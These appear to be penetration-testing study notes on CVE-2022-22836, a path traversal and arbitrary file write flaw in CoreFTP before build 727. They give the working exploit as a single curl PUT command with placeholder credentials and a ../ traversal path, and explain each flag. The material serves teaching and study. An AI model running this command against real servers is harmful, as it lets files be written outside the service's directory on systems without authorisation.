- `CoreFTP before build 727` vulnerability assigned [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836). 
- This vulnerability is for an FTP service that does not correctly process the `HTTP PUT` request and leads to an `authenticated directory`/`path traversal,` and `arbitrary file write` vulnerability. 
- This vulnerability allows us to write files outside the directory to which the service has access.
## The Concept of the Attack
The [exploit](https://www.exploit-db.com/exploits/50652) for this attack is relatively straightforward, based on a single `cURL` command.
#### CoreFTP Exploitation
```shell
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```
We create a raw HTTP `PUT` request (`-X PUT`) with basic auth (`--basic -u <username>:<password>`), the path for the file (`--path-as-is https://<IP>/../../../../../whoops`), and its content (`--data-binary "PoC."`) with this command. Additionally, we specify the host header (`-H "Host: <IP>"`) with the IP address of our target system.
#### The Concept of Attacks
![[core-ftp.png]]


